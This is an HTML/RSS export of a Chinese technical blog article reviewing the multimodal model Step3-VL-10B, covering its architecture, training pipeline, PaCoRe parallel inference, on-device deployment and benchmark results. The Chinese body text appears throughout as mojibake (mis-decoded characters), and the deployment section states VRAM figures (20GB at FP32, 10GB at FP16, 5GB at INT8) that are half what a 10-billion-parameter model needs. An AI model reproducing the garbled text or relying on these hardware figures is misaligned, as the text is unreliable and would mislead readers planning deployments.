pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨äººå·¥æ™ºèƒ½é¢†åŸŸï¼Œä¸€ä¸ªé•¿æœŸå­˜åœ¨çš„å…±è¯†æ˜¯ï¼šæ¨¡å‹è¶Šå¤§ï¼Œèƒ½åŠ›è¶Šå¼ºã€‚å°±åƒå»ºé€ é«˜æ¥¼ä¸€æ ·ï¼Œäººä»¬æ€»è®¤ä¸ºå±‚æ•°è¶Šå¤šã€é¢ç§¯è¶Šå¤§ï¼Œå°±è¶Šèƒ½å®¹çº³æ›´å¤šåŠŸèƒ½ã€‚ç„¶è€Œï¼Œé˜¶è·ƒæ˜Ÿè¾°åœ¨2026å¹´1æœˆ20æ—¥å¼€æºçš„å¤šæ¨¡æ€æ¨¡å‹Step3-VL-10Bï¼Œå´æ‰“ç ´äº†è¿™ä¸€å›ºæœ‰è®¤çŸ¥ã€‚è¿™æ¬¾ä»…æœ‰100äº¿å‚æ•°çš„æ¨¡å‹ï¼Œåœ¨å¤šé¡¹åŸºå‡†æµ‹è¯•ä¸­å±•ç°å‡ºæ¥è¿‘ç”šè‡³è¶…è¶Šå‚æ•°é‡ä¸ºå…¶10-20å€çš„å¤§å‹æ¨¡å‹çš„æ€§èƒ½ã€‚é‚£ä¹ˆï¼Œè¿™ä¸ª"å°é’¢ç‚®"æ˜¯å¦‚ä½•åšåˆ°çš„ï¼Ÿæœ¬æ–‡å°†ä»æŠ€æœ¯è§’åº¦æ·±å…¥è§£æStep3-VL-10Bçš„æ ¸å¿ƒè®¾è®¡ä¸å®ç°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/146601c255d242f8be69a9cdad2e7cde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu054KJ6IGK56eR5oqA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769648552&amp;x-signature=s0dKQ8OORqTutgAUy9SKgY1PsJQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-0">ä¸€ã€æ ¸å¿ƒæ¶æ„ï¼šä¸å †å‚æ•°ï¼Œé ååŒææ•ˆ</h2>
<p>Step3-VL-10Bçš„æ¶æ„è®¾è®¡æ ¸å¿ƒï¼Œæ˜¯æ”¾å¼ƒâ€œå¤§è€Œå…¨â€çš„å‚æ•°å †ç Œï¼Œè½¬è€Œè¿½æ±‚è§†è§‰ä¸è¯­è¨€æ¨¡å—çš„æ·±åº¦ååŒã€‚æ¨¡å‹æ•´ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆï¼Œå„æ¨¡å—èŒè´£æ¸…æ™°ä¸”è¡”æ¥æµç•…ï¼š</p>
<p>è§†è§‰ç¼–ç å™¨é‡‡ç”¨18äº¿å‚æ•°çš„PE-langï¼ˆè¯­è¨€ä¼˜åŒ–æ„ŸçŸ¥ç¼–ç å™¨ï¼‰ï¼Œå¹¶éä¼ ç»Ÿçš„ç©ºé—´ä¼˜åŒ–å‹ç¼–ç å™¨â€”â€”è¿™ç§é€‰æ‹©çœ‹ä¼¼ç‰ºç‰²äº†éƒ¨åˆ†çº¯ç²¹çš„è§†è§‰å»ºæ¨¡èƒ½åŠ›ï¼Œå®åˆ™è®©è§†è§‰ç‰¹å¾ä¸è¯­è¨€ç‰¹å¾çš„å¯¹é½æ•ˆç‡å¤§å¹…æå‡ï¼Œé¿å…äº†åç»­è·¨æ¨¡æ€èåˆæ—¶çš„â€œé€‚é…æˆæœ¬â€ã€‚è§£ç å™¨åˆ™åŸºäºæˆç†Ÿçš„Qwen3-8Bæ¨¡å‹ï¼Œä¾æ‰˜å…¶ç¨³å®šçš„æ–‡æœ¬ç”Ÿæˆèƒ½åŠ›å’Œå¤šæ¨¡æ€é€‚é…æ€§ï¼Œå‡å°‘äº†åŸºç¡€æ¨¡å—çš„ç ”å‘å†…è€—ã€‚</p>
<p>è¿æ¥ä¸¤è€…çš„æŠ•å½±å±‚è®¾è®¡é¢‡å…·å·§æ€ï¼šé€šè¿‡åŒæ­¥é•¿2å·ç§¯å±‚å®ç°16å€ç©ºé—´é™é‡‡æ ·ï¼Œæ—¢èƒ½æœ‰æ•ˆå‹ç¼©è§†è§‰ä»¤ç‰Œæ•°é‡ã€é™ä½è®¡ç®—å¼€é”€ï¼Œåˆèƒ½æœ€å¤§ç¨‹åº¦ä¿ç•™å›¾åƒå…³é”®ç»†èŠ‚ã€‚åŒæ—¶ï¼Œæ¨¡å‹é‡‡ç”¨å¤šå°ºåº¦è£å‰ªæ–¹æ¡ˆï¼Œå°†å›¾åƒæ‹†è§£ä¸º728Ã—728çš„å…¨å±€è§†å›¾å’Œå¤šä¸ª504Ã—504çš„å±€éƒ¨è§†å›¾ï¼Œæ—¢è§£å†³äº†å¤§åˆ†è¾¨ç‡å›¾åƒçš„å¤„ç†éš¾é¢˜ï¼Œåˆé€šè¿‡æ‰¹æ¬¡å¹¶è¡Œæ€§è§„é¿äº†å˜é•¿æ‰“åŒ…çš„å¤æ‚åº¦ï¼Œè¿™ä¸€è®¾è®¡åœ¨æ–‡æ¡£ç†è§£ã€OCRç­‰ä»»åŠ¡ä¸­ä¼˜åŠ¿å°¤ä¸ºæ˜æ˜¾ã€‚</p>
<h2 data-id="heading-1">äºŒã€è®­ç»ƒç­–ç•¥ï¼šä»é¢„è®­ç»ƒåˆ°åè®­ç»ƒçš„å…¨é“¾è·¯ä¼˜åŒ–</h2>
<p>å¦‚æœè¯´æ¶æ„æ˜¯éª¨æ¶ï¼Œè®­ç»ƒç­–ç•¥å°±æ˜¯èµ‹äºˆæ¨¡å‹èƒ½åŠ›çš„è¡€è‚‰ã€‚Step3-VL-10Bçš„æ€§èƒ½çªç ´ï¼Œå¹¶éä¾èµ–å•ä¸€æŠ€æœ¯åˆ›æ–°ï¼Œè€Œæ˜¯æºäºé¢„è®­ç»ƒã€ç›‘ç£å¾®è°ƒï¼ˆSFTï¼‰ã€å¼ºåŒ–å­¦ä¹ å…¨é“¾è·¯çš„ç²¾ç»†åŒ–è®¾è®¡ã€‚</p>
<h3 data-id="heading-2">1. é¢„è®­ç»ƒï¼š1.2Tä»¤ç‰Œçš„æ²‰æµ¸å¼èåˆå­¦ä¹ </h3>
<p>ä¼ ç»Ÿå¤šæ¨¡æ€æ¨¡å‹å¸¸é‡‡ç”¨â€œåˆ†é˜¶æ®µè®­ç»ƒâ€â€”â€”å…ˆå•ç‹¬è®­ç»ƒè§†è§‰å’Œè¯­è¨€æ¨¡å—ï¼Œå†é€šè¿‡é€‚é…å±‚è¿æ¥ï¼Œè¿™ç§æ–¹å¼å®¹æ˜“å¯¼è‡´ä¸¤å¤§æ¨¡å—â€œå„è‡ªä¸ºæˆ˜â€ï¼Œèåˆæ•ˆæœä¸ä½³ã€‚Step3-VL-10Båˆ™é‡‡ç”¨å•é˜¶æ®µå…¨å‚æ•°è§£å†»ç­–ç•¥ï¼Œä»è®­ç»ƒåˆæœŸå°±å°†è§†è§‰ç¼–ç å™¨ä¸è¯­è¨€è§£ç å™¨ä½œä¸ºæ•´ä½“ç«¯åˆ°ç«¯è®­ç»ƒï¼Œè®©ä¸¤è€…åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­è‡ªç„¶å½¢æˆååŒè®¤çŸ¥ã€‚</p>
<p>è®­ç»ƒæ•°æ®çš„æ„å»ºåŒæ ·å…³é”®ã€‚ç ”ç©¶å›¢é˜Ÿå›´ç»•â€œç²¾ç»†æ„ŸçŸ¥â€å’Œâ€œå¤æ‚æ¨ç†â€ä¸¤å¤§ç›®æ ‡ï¼Œæ•´ç†äº†1.2ä¸‡äº¿ä»¤ç‰Œçš„å¤šæ¨¡æ€è¯­æ–™åº“ï¼Œè¦†ç›–çŸ¥è¯†ç±»ã€æ•™è‚²ç±»ã€OCRç±»ã€GUIäº¤äº’ç­‰å¤šä¸ªåœºæ™¯ï¼šæ—¢æœ‰Common Crawlçš„é€šç”¨å›¾æ–‡æ•°æ®ï¼Œä¹Ÿæœ‰1500ä¸‡ä»½K12åˆ°é«˜ç­‰æ•™è‚²çš„å­¦ç§‘çœŸé¢˜ï¼Œè¿˜æœ‰1.2äº¿æ ·æœ¬çš„OCRä¸“é¡¹æ•°æ®å’Œ2300ä¸‡æ ·æœ¬çš„GUIç•Œé¢æ•°æ®ã€‚è¿™ç§å¤šå…ƒåŒ–çš„æ•°æ®åˆ†å¸ƒï¼Œè®©æ¨¡å‹ä¸ä»…èƒ½å¤„ç†é€šç”¨åœºæ™¯ï¼Œè¿˜èƒ½é€‚é…æ–‡æ¡£ç†è§£ã€æ™ºèƒ½ä½“äº¤äº’ç­‰ç»†åˆ†ä»»åŠ¡ã€‚</p>
<p>é¢„è®­ç»ƒè¿‡ç¨‹åˆ†ä¸ºä¸¤é˜¶æ®µæ¨è¿›ï¼šå‰9000äº¿ä»¤ç‰Œä¾§é‡é€šç”¨è¡¨å¾å­¦ä¹ ï¼Œå­¦ä¹ ç‡ä»5Ã—10â»âµè¡°å‡è‡³1Ã—10â»âµï¼›å300äº¿ä»¤ç‰Œåˆ™èšç„¦é«˜è´¨é‡æ•°æ®æ··åˆï¼Œå­¦ä¹ ç‡è¿›ä¸€æ­¥é€€ç«è‡³6Ã—10â»â¶ï¼Œé‡ç‚¹å¼ºåŒ–OCRã€ç›®æ ‡å®šä½ç­‰ç»†ç²’åº¦èƒ½åŠ›ï¼Œè¿™ç§å¾ªåºæ¸è¿›çš„è°ƒåº¦çš„æ–¹å¼ï¼Œè®©æ¨¡å‹èƒ½åŠ›ç¨³æ­¥æå‡ï¼Œé¿å…äº†åæœŸè®­ç»ƒçš„éœ‡è¡ã€‚</p>
<h3 data-id="heading-3">2. åè®­ç»ƒï¼šè¶…1400è½®å¼ºåŒ–å­¦ä¹ çš„ç²¾å‡†æ‰“ç£¨</h3>
<p>é¢„è®­ç»ƒå¥ å®šåŸºç¡€èƒ½åŠ›åï¼Œåè®­ç»ƒé˜¶æ®µçš„æ ¸å¿ƒæ˜¯è®©æ¨¡å‹â€œä¼šè§£é¢˜ã€è§£å¯¹é¢˜â€ã€‚Step3-VL-10Bé‡‡ç”¨ä¸¤é˜¶æ®µSFT+å¤šè½®å¼ºåŒ–å­¦ä¹ çš„æµæ°´çº¿ï¼š</p>
<p>SFTé˜¶æ®µå…ˆä»¥9:1çš„æ–‡æœ¬ä¸å¤šæ¨¡æ€æ ·æœ¬æ¯”ä¾‹è®­ç»ƒï¼Œå¤¯å®é€»è¾‘æ¨ç†å’Œè¯­è¨€è¡¨è¾¾åŸºç¡€ï¼›å†è°ƒæ•´ä¸º1:1çš„æ¯”ä¾‹ï¼Œå¹³è¡¡è§†è§‰æ„ŸçŸ¥ä¸æ–‡æœ¬æ¨ç†èƒ½åŠ›ï¼Œè¿™ç§è®¾è®¡ç¬¦åˆâ€œå…ˆé€šç†ã€å†è½åœ°â€çš„è®¤çŸ¥è§„å¾‹ã€‚æ•°æ®å±‚é¢ï¼Œé€šè¿‡è§„åˆ™è¿‡æ»¤å’ŒN-gramåŒ¹é…åŒé‡æ ¡éªŒï¼Œå‰”é™¤é€€åŒ–æ ·æœ¬å’ŒåŸºå‡†æµ‹è¯•æ±¡æŸ“æ•°æ®ï¼Œç¡®ä¿è®­ç»ƒæ•°æ®çš„é«˜è´¨é‡ã€‚</p>
<p>å¼ºåŒ–å­¦ä¹ é˜¶æ®µåˆ™æ˜¯æ€§èƒ½è·ƒå‡çš„å…³é”®ã€‚æ¨¡å‹ç»è¿‡è¶…1400è½®è¿­ä»£è®­ç»ƒï¼Œå…¶ä¸­600è½®ä¸ºå¯éªŒè¯å¥–åŠ±å¼ºåŒ–å­¦ä¹ ï¼ˆRLVRï¼‰ï¼Œé’ˆå¯¹æ•°å­¦ã€ç‰©ç†ç­‰æœ‰æ˜ç¡®æ ‡å‡†ç­”æ¡ˆçš„ä»»åŠ¡ï¼Œé€šè¿‡â€œç­”å¯¹åŠ åˆ†ã€ç­”é”™ä¸åŠ åˆ†â€çš„å¼ºåé¦ˆæœºåˆ¶ä¼˜åŒ–æ¨ç†ç²¾åº¦ï¼›300è½®ä¸ºäººç±»åé¦ˆå¼ºåŒ–å­¦ä¹ ï¼ˆRLHFï¼‰ï¼Œèšç„¦å¼€æ”¾ç”Ÿæˆä»»åŠ¡ï¼Œé€šè¿‡å¥–åŠ±æ¨¡å‹è¯„åˆ¤ç­”æ¡ˆè´¨é‡ï¼Œçº¦æŸè¯­è¨€æ··æ‚ã€æé€ å¼•ç”¨ç­‰ä¸è‰¯è¡Œä¸ºã€‚è¿™ç§â€œç²¾å‡†åé¦ˆ+åˆ†ä»»åŠ¡ä¼˜åŒ–â€çš„æ–¹å¼ï¼Œè®©æ¨¡å‹ä¸ä»…èƒ½è¾“å‡ºæ­£ç¡®ç­”æ¡ˆï¼Œè¿˜èƒ½ä¿è¯æ¨ç†è¿‡ç¨‹çš„åˆç†æ€§ã€‚</p>
<h2 data-id="heading-4">ä¸‰ã€æ¨ç†åˆ›æ–°ï¼šPaCoReå¹¶è¡Œæ¡†æ¶æ‰“ç ´æ•ˆç‡ç“¶é¢ˆ</h2>
<p>é™¤äº†è®­ç»ƒé˜¶æ®µçš„ä¼˜åŒ–ï¼ŒStep3-VL-10Båœ¨æ¨ç†ç¯èŠ‚ä¹Ÿåšäº†çªç ´æ€§è®¾è®¡ï¼Œæå‡ºå¹¶è¡ŒååŒæ¨ç†æ¡†æ¶ï¼ˆPaCoReï¼‰ï¼Œé€šè¿‡ä¼˜åŒ–æµ‹è¯•æ—¶çš„ç®—åŠ›åˆ†é…ï¼Œè¿›ä¸€æ­¥é‡Šæ”¾æ¨¡å‹æ½œèƒ½ã€‚</p>
<p>ä¼ ç»Ÿå¤šæ¨¡æ€æ¨ç†å¤šé‡‡ç”¨é¡ºåºç”Ÿæˆæ¨¡å¼ï¼ˆSeReï¼‰ï¼Œæ¨¡å‹æŒ‰å›ºå®šæµç¨‹å¤„ç†ä¿¡æ¯ï¼Œå°±åƒä¸€ä¸ªäººç‹¬è‡ªè§£é¢˜ï¼Œå®¹æ˜“å› å•ä¸€æ€è·¯å±€é™å¯¼è‡´è¯¯å·®ã€‚è€ŒPaCoReæ¨¡å¼åˆ™æ¨¡æ‹Ÿâ€œå°ç»„è®¨è®ºâ€çš„åœºæ™¯ï¼šé’ˆå¯¹åŒä¸€é—®é¢˜ï¼Œè®©æ¨¡å‹ç”Ÿæˆ16ä¸ªç‹¬ç«‹çš„æ¨ç†ç»“æœï¼Œå†å°†è¿™äº›ç»“æœä½œä¸ºå‚è€ƒææ–™ï¼Œç»¼åˆåˆ†æåè¾“å‡ºæœ€ç»ˆç­”æ¡ˆã€‚æ¯ä¸ªç‹¬ç«‹æ¨ç†è·¯å¾„å¯èƒ½å…³æ³¨å›¾åƒçš„ä¸åŒç»†èŠ‚æˆ–é‡‡ç”¨ä¸åŒçš„è§£é¢˜æ€è·¯ï¼Œé€šè¿‡èšåˆå¤šè·¯å¾„è¯æ®ï¼Œæœ‰æ•ˆé™ä½äº†å•ä¸€æ¨ç†çš„å¶ç„¶æ€§è¯¯å·®ã€‚</p>
<p>å®æµ‹æ•°æ®æ˜¾ç¤ºï¼ŒPaCoReæ¨¡å¼èƒ½æ˜¾è‘—æå‡æ¨¡å‹åœ¨å¤æ‚ä»»åŠ¡ä¸­çš„è¡¨ç°ï¼šMathVisionæµ‹è¯•ä¸­ï¼Œæˆç»©ä»70.81%æå‡è‡³75.95%ï¼›AIME 2025æµ‹è¯•ä¸­æ›´æ˜¯è¾¾åˆ°94.43%ï¼Œè¶…è¶Šäº†å¤šæ•°10å€å‚æ•°è§„æ¨¡çš„æ¨¡å‹ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™ç§æå‡å¹¶éä¾èµ–å‚æ•°å¢åŠ ï¼Œè€Œæ˜¯é€šè¿‡ç®—åŠ›çš„çµæ´»åˆ†é…å®ç°ï¼Œåœ¨å®é™…éƒ¨ç½²ä¸­å¯æ ¹æ®ä»»åŠ¡éœ€æ±‚é€‰æ‹©æ˜¯å¦å¼€å¯ï¼Œå…¼é¡¾ç²¾åº¦ä¸æ•ˆç‡ã€‚</p>
<h2 data-id="heading-5">å››ã€ç«¯ä¾§éƒ¨ç½²çš„èµ„æºæ•ˆç‡</h2>
<p>Step3-VL-10Bçš„å¦ä¸€å¤§ä¼˜åŠ¿æ˜¯å…¶å‡ºè‰²çš„ç«¯ä¾§éƒ¨ç½²èƒ½åŠ›ã€‚åœ¨èµ„æºæ•ˆç‡æ–¹é¢ï¼Œæ¨¡å‹æä¾›äº†ä¸åŒç²¾åº¦ç‰ˆæœ¬ï¼š</p>
<ul>
<li>FP32ç²¾åº¦ï¼šéœ€è¦çº¦20GBæ˜¾å­˜</li>
<li>FP16ç²¾åº¦ï¼šéœ€è¦çº¦10GBæ˜¾å­˜</li>
<li>INT8é‡åŒ–ç‰ˆæœ¬ï¼šä»…éœ€5GBæ˜¾å­˜</li>
</ul>
<p>è¿™ç§é‡åŒ–ç­–ç•¥ä½¿å¾—Step3-VL-10Bå¯ä»¥åœ¨æ™®é€šæ¶ˆè´¹çº§æ˜¾å¡ï¼ˆå¦‚RTX 3090ï¼‰ä¸Šè¿è¡Œï¼Œè€Œæ— éœ€ä¾èµ–æ˜‚è´µçš„äº‘ç«¯GPUé›†ç¾¤ã€‚<strong>è¿™ç§èµ„æºæ•ˆç‡çš„æå‡ï¼Œæ˜¯æ¨¡å‹èƒ½å¤Ÿå®ç°"å°å‚æ•°ã€å¤§æ™ºæ…§"çš„å…³é”®å› ç´ ä¹‹ä¸€</strong>ã€‚</p>
<p>åœ¨å®é™…éƒ¨ç½²åœºæ™¯ä¸­ï¼ŒStep3-VL-10Bå·²ä¸å¤šå®¶ä¼ä¸šè¾¾æˆåˆä½œã€‚ä¾‹å¦‚ï¼Œé˜¶è·ƒæ˜Ÿè¾°ä¸å‰åˆ©æ±½è½¦é›†å›¢åˆä½œï¼Œåœ¨æ™ºèƒ½åº§èˆ±ä¸­é›†æˆStep3-VL-10Bçš„èƒ½åŠ›ï¼Œå®ç°ç¦»çº¿æ–‡æ¡£è§£æå’Œç•Œé¢æ“ä½œï¼›ä¸OPPOç­‰å¤´éƒ¨æ‰‹æœºå‚å•†åˆä½œï¼Œåœ¨æ——èˆ°æœºå‹ä¸Šæ·±åº¦é›†æˆå¤šæ¨¡æ€æ¨¡å‹ï¼Œæ”¯æŒæœ¬åœ°åŒ–çš„å›¾åƒè¯†åˆ«å’ŒOCRåŠŸèƒ½ã€‚</p>
<p><strong>ç«¯ä¾§éƒ¨ç½²çš„çªç ´æ€§æ„ä¹‰åœ¨äºï¼Œå®ƒå°†å¤šæ¨¡æ€AIä»äº‘ç«¯çš„"å¥¢ä¾ˆå“"å˜æˆäº†ç»ˆç«¯è®¾å¤‡çš„"æ—¥å¸¸ç”¨å“"</strong>ã€‚è¿™æ„å‘³ç€æ›´å¤šçš„åº”ç”¨åœºæ™¯ï¼ˆå¦‚åŒ»ç–—è¯Šæ–­ã€å·¥ä¸šè´¨æ£€ã€æ•™è‚²è¾…åŠ©ï¼‰å¯ä»¥åœ¨æœ¬åœ°è®¾å¤‡ä¸Šå®ç°ï¼Œæ— éœ€ä¾èµ–ç½‘ç»œè¿æ¥å’Œäº‘ç«¯è®¡ç®—èµ„æºï¼Œå¤§å¤§é™ä½äº†åº”ç”¨é—¨æ§›ã€‚</p>
<h2 data-id="heading-6">äº”ã€å®é™…è¡¨ç°ï¼šå®¢è§‚çœ‹å¾…â€œä»¥å°åšå¤§â€çš„è¾¹ç•Œ</h2>
<p>è¯„ä»·ä¸€æ¬¾æ¨¡å‹ä¸èƒ½åªçœ‹æŠ€æœ¯è®¾è®¡ï¼Œæ›´è¦è½åˆ°å…·ä½“çš„åŸºå‡†æµ‹è¯•å’Œåº”ç”¨åœºæ™¯ä¸­ã€‚Step3-VL-10Bçš„è¡¨ç°å¯ä»¥ç”¨â€œåŒé‡çº§é¢†å…ˆï¼Œè·¨é‡çº§æ¯”è‚©â€æ¥æ¦‚æ‹¬ï¼ŒåŒæ—¶ä¹Ÿå­˜åœ¨æ˜ç¡®çš„èƒ½åŠ›è¾¹ç•Œã€‚</p>
<p>åœ¨10Bå‚æ•°é‡çº§çš„å¼€æºæ¨¡å‹ä¸­ï¼Œå…¶ç»¼åˆæ€§èƒ½å¤„äºç¬¬ä¸€æ¢¯é˜Ÿï¼šMMBenchï¼ˆENï¼‰æµ‹è¯•è¾¾92.05%ï¼ŒMMMUè¾¾78.11%ï¼ŒOCRBenchè¾¾86.75%ï¼Œåœ¨STEMæ¨ç†ã€OCRã€GUIäº¤äº’ç­‰ä»»åŠ¡ä¸Šå…¨é¢è¶…è¶ŠGLM-4.6V-Flashï¼ˆ9Bï¼‰ã€Qwen3-VL-Thinkingï¼ˆ8Bï¼‰ç­‰åŒç±»æ¨¡å‹ã€‚</p>
<p>ä¸10-20å€å‚æ•°è§„æ¨¡çš„å¤§æ¨¡å‹ç›¸æ¯”ï¼Œå…¶è¡¨ç°å‘ˆç°â€œå±€éƒ¨é¢†å…ˆã€æ•´ä½“æŒå¹³â€çš„ç‰¹ç‚¹ï¼šåœ¨MathVistaæµ‹è¯•ä¸­ï¼ŒSeReæ¨¡å¼ä¸‹83.97%çš„æˆç»©æ¥è¿‘Qwen3-VLï¼ˆ235Bï¼‰çš„85.10%ï¼ŒPaCoReæ¨¡å¼ä¸‹æ›´æ˜¯è¾¾åˆ°85.50%ï¼›AIME 2025å’ŒHMMT 2025ç­‰æ•°å­¦æ¨ç†æµ‹è¯•ä¸­ï¼Œå‡­å€ŸPaCoReæ¡†æ¶çš„ä¼˜åŠ¿ï¼Œè¡¨ç°ç”šè‡³è¶…è¿‡éƒ¨åˆ†åƒäº¿çº§æ¨¡å‹ã€‚ä½†åœ¨éœ€è¦æµ·é‡çŸ¥è¯†å‚¨å¤‡çš„é€šç”¨é—®ç­”ã€è¶…é«˜åˆ†è¾¨ç‡å›¾åƒç²¾ç»†åˆ†å‰²ç­‰ä»»åŠ¡ä¸Šï¼Œä»ä¸åƒäº¿çº§é—­æºæ¨¡å‹å­˜åœ¨å·®è·ã€‚</p>
<h2 data-id="heading-7">å…­ã€æ€»ç»“ä¸å±•æœ›ï¼šè½»é‡åŒ–æ¨¡å‹çš„å®ç”¨ä»·å€¼</h2>
<p>Step3-VL-10Bçš„æ„ä¹‰ï¼Œä¸åœ¨äºé¢ è¦†â€œå¤§æ¨¡å‹æ›´å¼ºâ€çš„è®¤çŸ¥ï¼Œè€Œåœ¨äºè¯æ˜äº†è½»é‡åŒ–æ¨¡å‹é€šè¿‡ç²¾å‡†çš„æ¶æ„è®¾è®¡ã€ç²¾ç»†åŒ–çš„è®­ç»ƒç­–ç•¥ï¼Œèƒ½å¤Ÿåœ¨ç‰¹å®šåœºæ™¯ä¸‹è¾¾åˆ°ç”šè‡³è¶…è¶Šå¤§æ¨¡å‹çš„è¡¨ç°ï¼Œä¸ºå¤šæ¨¡æ€æŠ€æœ¯çš„è½åœ°æä¾›äº†æ–°è·¯å¾„ã€‚</p>
<p>å¯¹äºæ™®é€šç ”å‘å›¢é˜Ÿå’Œä¸­å°ä¼ä¸šè€Œè¨€ï¼Œè¿™æ¬¾å¼€æºæ¨¡å‹çš„ä»·å€¼å°¤ä¸ºçªå‡ºï¼š10Bå‚æ•°ä½“é‡æ„å‘³ç€è¾ƒä½çš„éƒ¨ç½²é—¨æ§›ï¼Œæ— éœ€ä¾èµ–å¤§è§„æ¨¡GPUé›†ç¾¤å³å¯å®ç°æœ¬åœ°åŒ–éƒ¨ç½²ï¼›è€Œåœ¨æ–‡æ¡£å¤„ç†ã€æ™ºèƒ½å®¢æœã€è½»é‡çº§è§†è§‰é—®ç­”ç­‰åœºæ™¯ä¸­ï¼Œå…¶æ€§èƒ½å®Œå…¨èƒ½å¤Ÿæ»¡è¶³å®é™…éœ€æ±‚ã€‚</p>
<p>å½“ç„¶ï¼Œæ¨¡å‹ä»æœ‰ä¼˜åŒ–ç©ºé—´ï¼Œæ¯”å¦‚PaCoReæ¨¡å¼ä¸‹çš„ç®—åŠ›å¼€é”€ç›¸å¯¹è¾ƒé«˜ï¼Œåœ¨è¾¹ç¼˜è®¾å¤‡ä¸Šçš„é€‚é…ä»éœ€æ‰“ç£¨ï¼Œè·¨è¯­è¨€å¤šæ¨¡æ€èƒ½åŠ›ä¹Ÿæœ‰æå‡ä½™åœ°ã€‚ä½†ä¸å¯å¦è®¤ï¼ŒStep3-VL-10Bä¸ºè½»é‡åŒ–å¤šæ¨¡æ€æ¨¡å‹çš„å‘å±•æä¾›äº†å¯å¤ç”¨çš„æŠ€æœ¯èŒƒå¼â€”â€”æœªæ¥ï¼Œå¤šæ¨¡æ€æ¨¡å‹çš„ç«äº‰æˆ–è®¸ä¸å†æ˜¯å•çº¯çš„å‚æ•°è§„æ¨¡ç«èµ›ï¼Œè€Œæ˜¯æ•ˆç‡ä¸èƒ½åŠ›çš„ç²¾å‡†å¹³è¡¡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>